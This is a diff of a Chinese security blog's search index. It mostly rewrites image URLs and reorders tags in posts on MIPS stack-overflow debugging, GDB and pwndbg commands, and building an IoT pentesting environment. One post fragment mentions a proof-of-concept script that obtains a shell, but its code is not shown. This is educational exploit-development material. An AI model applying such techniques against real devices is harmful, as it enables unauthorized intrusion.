 print &#39; ok!&#39;</code></pre>
 <p>将上述代码保存为<code>poc.py</code>,运行结果如下</p>
-<p><img src="http://file.smilehacker.net/result.png" alt="result"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/result.png" alt="result"></p>
 <p>成功拿到shell</p>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
 <li><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></li>
@@ -1524,8 +1524,8 @@ print &#39; ok!&#39;</code></pre>
         <category>IoT</category>
       </categories>
       <tags>
-        <tag>IoT</tag>
         <tag>调试</tag>
+        <tag>IoT</tag>
         <tag>Debug</tag>
         <tag>Mips</tag>
         <tag>溢出</tag>
@@ -1542,7 +1542,7 @@ cd pwndbg
 <p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p>
 <a id="more"></a>
 
-<p><img src="http://file.smilehacker.net/1570720622109.png" alt="pwndbg界面展示"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/GDB_DEBUG_COMMAND/1570720622109.png" alt="pwndbg界面展示"></p>
 <h2 id="启动GDB"><a href="#启动GDB" class="headerlink" title="启动GDB"></a>启动GDB</h2><p>对C/C++程序的调试，需要在编译前就加上-g选项:</p>
 <pre><code class="bash">$g++ -g hello.cpp -o hello</code></pre>
 <p>调试可执行文件:</p>
@@ -1630,22 +1630,22 @@ $gdb hello 11127</code></pre>
 <li>b *func_name+n: 在func_name函数偏移n行的位置下断点</li>
 </ul>
 <p>例如:</p>
-<p><img src="http://file.smilehacker.net/1570722300144.png" alt="汇编断点调试"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/GDB_DEBUG_COMMAND/1570722300144.png" alt="汇编断点调试"></p>
 <h3 id="GDB中使用管道进行调试"><a href="#GDB中使用管道进行调试" class="headerlink" title="GDB中使用管道进行调试"></a>GDB中使用管道进行调试</h3><p>输入的不是参数，而是标准输入(stdin)</p>
 <pre><code class="shell">gdb ./vuln_prog
 run &lt; filename_with_input</code></pre>
 <h3 id="GDB-查看栈帧多行数据"><a href="#GDB-查看栈帧多行数据" class="headerlink" title="GDB 查看栈帧多行数据"></a>GDB 查看栈帧多行数据</h3><p>可以清楚看到栈帧里面的情况，一目了然，前面搞死人了</p>
 <pre><code class="shell">stack n[要查看具体多少]</code></pre>
-<p><img src="http://file.smilehacker.net/1571206209216.png" alt="查看堆栈"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/GDB_DEBUG_COMMAND/1571206209216.png" alt="查看堆栈"></p>
 ]]></content>
       <categories>
         <category>安全</category>
         <category>调试</category>
       </categories>
       <tags>
-        <tag>调试</tag>
         <tag>安全</tag>
         <tag>GDB</tag>
+        <tag>调试</tag>
       </tags>
   </entry>
   <entry>
@@ -1706,7 +1706,7 @@ sudo apt-get install libncurses5-dev patch
 make clean
 
 make menuconfig</code></pre>
-<p>需要设置以下三个选项<br><img src="http://file.smilehacker.net/buildroot_set1.png" alt="buildroot安装选项"></p>
+<p>需要设置以下三个选项<br><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/IOT_pentest_env_build/buildroot_set1.png" alt="buildroot安装选项"></p>
 <ul>
 <li>Target options -&gt; Target Architecture 设置为Mips (little endian)</li>
 <li>Target options -&gt; Target Architecture Variant 设置为 MIPS32</li>
@@ -1741,8 +1741,8 @@ python install.py /IDA PATH/ --install </code></pre>
         <category>安全</category>
       </categories>
       <tags>
-        <tag>IoT</tag>
         <tag>安全</tag>
+        <tag>IoT</tag>
       </tags>
   </entry>
 </search>
